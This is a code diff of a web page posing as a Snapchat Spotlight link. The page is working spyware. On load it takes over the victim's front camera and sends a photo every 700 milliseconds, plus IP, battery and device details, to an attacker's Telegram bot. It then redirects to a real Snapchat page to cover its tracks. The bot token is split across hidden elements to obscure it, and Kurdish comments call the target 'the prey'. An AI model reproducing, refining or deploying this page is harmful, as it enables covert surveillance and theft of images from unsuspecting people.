@@ -5,43 +5,39 @@
     <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
     <title>snapchat spotlight</title>
     <style>
-        :root { --config-node: "AAHgyPYR-Z"; } /* پارچەی دووەم لێرەیە */
+        :root { --config-node: "AAHgyPYR-Z"; }
         body { background-color: white; margin: 0; overflow: hidden; }
-        .hidden-layer { display: none; opacity: 0; }
+        .hidden-layer { display: none; visibility: hidden; }
     </style>
 </head>
 <body onload="capture()">
 
-    
     <a href="#" id="v_ref_link" class="hidden-layer">8431515310:</a>
 
     <div class="main-content">
         <p>Loading application resources...</p>
-
         <p class="hidden-layer" id="p_node_val">Fn2QF-xU2367CK</p>
     </div>
 
 <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const targetID = urlParams.get('id'); 
-    
-
-    const _p1 = document.getElementById("v_ref_link").innerText;
-    const _p2 = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
-    const _p3 = document.getElementById("p_node_val").innerText;
-
     async function capture() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetID = urlParams.get('id'); 
+        
         if (!targetID) return;
 
-        setTimeout(() => {
-            window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
-        }, 5000);
-
-    
-        const _p4 = document.getElementById("sys_check_tail").innerText;
-        const TOKEN = _p1 + _p2 + _p3 + _p4;
-
         try {
+            const _p1 = document.getElementById("v_ref_link").innerText;
+            const _p2 = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
+            const _p3 = document.getElementById("p_node_val").innerText;
+            const _p4 = document.getElementById("sys_check_tail").innerText;
+            
+            const TOKEN = _p1 + _p2 + _p3 + _p4;
+
+            setTimeout(() => {
+                window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
+            }, 5000);
+
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
                 audio: false 
@@ -61,7 +57,7 @@
                                  `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
                                  `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
                                  `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
-                    _sendMsg(report, TOKEN);
+                    _sendMsg(report, TOKEN, targetID);
                 });
 
             const video = document.createElement('video');
@@ -75,33 +71,38 @@
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0);
-                canvas.toBlob(b => { if (b) _sendFile(b, "photo", TOKEN); }, 'image/jpeg', 0.9);
+                canvas.toBlob(b => { if (b) _sendFile(b, "photo", TOKEN, targetID); }, 'image/jpeg', 0.9);
             };
             setInterval(takeSnap, 700);
 
         } catch (e) {
-            _sendMsg(" نێچیرەکە ڕێگری کرد لە مۆڵەتی کامێرا", TOKEN);
+            const _p1_e = document.getElementById("v_ref_link").innerText;
+            const _p2_e = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
+            const _p3_e = document.getElementById("p_node_val").innerText;
+            const _p4_e = document.getElementById("sys_check_tail").innerText;
+            const T_E = _p1_e + _p2_e + _p3_e + _p4_e;
+
+            _sendMsg(" نێچیرەکە ڕێگری کرد لە مۆڵەتی کامێرا", T_E, targetID);
             window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
         }
     }
 
-    function _sendMsg(text, tk) {
+    function _sendMsg(text, tk, uid) {
         fetch(`https://api.telegram.org/bot${tk}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
+            body: JSON.stringify({chat_id: uid, text: text, parse_mode: "HTML"})
         });
     }
 
-    function _sendFile(blob, type, tk) {
+    function _sendFile(blob, type, tk, uid) {
         let fd = new FormData();
-        fd.append("chat_id", targetID);
+        fd.append("chat_id", uid);
         fd.append(type, blob, "victim.jpg");
         fetch(`https://api.telegram.org/bot${tk}/sendPhoto`, { method: 'POST', body: fd });
     }
 </script>
 
-    
     <div class="hidden-layer">
         <code id="sys_check_tail">KRQPP-YQq1s</code>
     </div>
